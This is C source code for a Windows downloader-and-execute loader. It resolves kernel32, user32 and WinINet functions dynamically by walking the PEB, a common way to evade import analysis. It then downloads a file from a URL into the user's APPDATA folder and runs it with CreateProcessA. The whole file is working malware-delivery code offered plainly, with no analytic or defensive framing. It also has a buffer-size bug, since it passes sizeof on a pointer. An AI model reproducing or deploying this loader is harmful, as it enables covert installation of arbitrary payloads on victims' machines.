#include <windows.h>
#include "peb.h"

#define INTERNET_OPEN_TYPE_DIRECT 1
#define INTERNET_FLAG_RELOAD 0x80000000

typedef HANDLE(WINAPI* CreateFileA_Func)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* WriteFile_Func)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* CloseHandle_Func)(HANDLE);
typedef BOOL(WINAPI* CreateProcessA_Func)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HMODULE(WINAPI* LoadLibraryA_Func)(LPCSTR);
typedef BOOL(WINAPI* FreeLibrary_Func)(HMODULE);
typedef DWORD(WINAPI* GetEnvironmentVariableA_Func)(LPCSTR, LPSTR, DWORD);
typedef int(WINAPI* wsprintfA_Func)(LPSTR, LPCSTR, ...);
typedef LPVOID(WINAPI* InternetOpenA_Func)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef LPVOID(WINAPI* InternetOpenUrlA_Func)(LPVOID, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* InternetReadFile_Func)(LPVOID, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* InternetCloseHandle_Func)(LPVOID);
typedef LPVOID(WINAPI* VirtualAlloc_Func)(LPVOID, SIZE_T, DWORD, DWORD);

typedef struct {
    CreateFileA_Func CreateFileA;
    WriteFile_Func WriteFile;
    CloseHandle_Func CloseHandle;
    CreateProcessA_Func CreateProcessA;
    LoadLibraryA_Func LoadLibraryA;
    FreeLibrary_Func FreeLibrary;
    GetEnvironmentVariableA_Func GetEnvironmentVariableA;
    wsprintfA_Func wsprintfA;
    InternetOpenA_Func InternetOpenA;
    InternetOpenUrlA_Func InternetOpenUrlA;
    InternetReadFile_Func InternetReadFile;
    InternetCloseHandle_Func InternetCloseHandle;
    VirtualAlloc_Func VirtualAlloc;
} Win32Funcs;

BOOL ResolveWin32Functions(Win32Funcs* funcs)
{
    WCHAR kernel32_dll_name[] = L"kernel32.dll";
    HMODULE hKernel32 = (HMODULE)get_module_by_name(kernel32_dll_name);
    if (!hKernel32)
        return FALSE;

    funcs->CreateFileA = (CreateFileA_Func)get_func_by_name(hKernel32, "CreateFileA");
    funcs->WriteFile = (WriteFile_Func)get_func_by_name(hKernel32, "WriteFile");
    funcs->CloseHandle = (CloseHandle_Func)get_func_by_name(hKernel32, "CloseHandle");
    funcs->CreateProcessA = (CreateProcessA_Func)get_func_by_name(hKernel32, "CreateProcessA");
    funcs->LoadLibraryA = (LoadLibraryA_Func)get_func_by_name(hKernel32, "LoadLibraryA");
    funcs->FreeLibrary = (FreeLibrary_Func)get_func_by_name(hKernel32, "FreeLibrary");
    funcs->GetEnvironmentVariableA = (GetEnvironmentVariableA_Func)get_func_by_name(hKernel32, "GetEnvironmentVariableA");
    funcs->VirtualAlloc = (VirtualAlloc_Func)get_func_by_name(hKernel32, "VirtualAlloc");

    HMODULE hUser32 = funcs->LoadLibraryA("user32.dll");
    if (!hUser32)
        return FALSE;

    funcs->wsprintfA = (wsprintfA_Func)get_func_by_name(hUser32, "wsprintfA");

    HMODULE hWinINet = funcs->LoadLibraryA("wininet.dll");
    if (!hWinINet)
        return FALSE;

    funcs->InternetOpenA = (InternetOpenA_Func)get_func_by_name(hWinINet, "InternetOpenA");
    funcs->InternetOpenUrlA = (InternetOpenUrlA_Func)get_func_by_name(hWinINet, "InternetOpenUrlA");
    funcs->InternetReadFile = (InternetReadFile_Func)get_func_by_name(hWinINet, "InternetReadFile");
    funcs->InternetCloseHandle = (InternetCloseHandle_Func)get_func_by_name(hWinINet, "InternetCloseHandle");

    if (!funcs->InternetOpenA || !funcs->InternetOpenUrlA || !funcs->InternetReadFile || !funcs->InternetCloseHandle || !funcs->wsprintfA)
    {
        funcs->FreeLibrary(hWinINet);
        return FALSE;
    }

    return TRUE;
}

BOOL GetAppDataPath(Win32Funcs* funcs, char* appDataPath, DWORD size)
{
    return funcs->GetEnvironmentVariableA("APPDATA", appDataPath, size);
}

BOOL DownloadFile(Win32Funcs* funcs, LPCSTR url, LPCSTR filePath)
{
    LPVOID hInternet = funcs->InternetOpenA("Meow", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
        return FALSE;

    LPVOID hUrlFile = funcs->InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrlFile)
    {
        funcs->InternetCloseHandle(hInternet);
        return FALSE;
    }

    HANDLE hFile = funcs->CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        funcs->InternetCloseHandle(hUrlFile);
        funcs->InternetCloseHandle(hInternet);
        return FALSE;
    }

    const DWORD bufferSize = 4096;

    char* buffer = (char*)funcs->VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        funcs->InternetCloseHandle(hUrlFile);
        funcs->InternetCloseHandle(hInternet);
        return FALSE;
    }
    my_memset(buffer, 0, bufferSize);
    DWORD bytesRead, bytesWritten;
    BOOL bResult = TRUE;

    while (funcs->InternetReadFile(hUrlFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0)
    {
        if (!funcs->WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesRead != bytesWritten)
        {
            bResult = FALSE;
            break;
        }
    }

    funcs->CloseHandle(hFile);
    funcs->InternetCloseHandle(hUrlFile);
    funcs->InternetCloseHandle(hInternet);

    return bResult;
}

void ExecuteFile(Win32Funcs* funcs, LPCSTR filePath)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    my_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    my_memset(&pi, 0, sizeof(pi));

    if (funcs->CreateProcessA(filePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        funcs->CloseHandle(pi.hProcess);
        funcs->CloseHandle(pi.hThread);
    }
}

int main()
{
    LPCSTR filename;
    LPCSTR url;

    __asm {
        mov eax, [ebp + 8]
        mov ecx, [ebp + 12]
        mov filename, eax
        mov url, ecx
    }

    Win32Funcs funcs;
    if (!ResolveWin32Functions(&funcs))
        return 0;

    char appDataPath[MAX_PATH];
    my_memset(appDataPath, 0, sizeof(appDataPath));

    char fullPath[MAX_PATH];
    my_memset(fullPath, 0, sizeof(fullPath));

    if (GetAppDataPath(&funcs, appDataPath, sizeof(appDataPath)))
    {
        funcs.wsprintfA(fullPath, "%s\\%s", appDataPath, filename);
        if (DownloadFile(&funcs, url, fullPath))
        {
            ExecuteFile(&funcs, fullPath);
        }
    }

    return 0;
}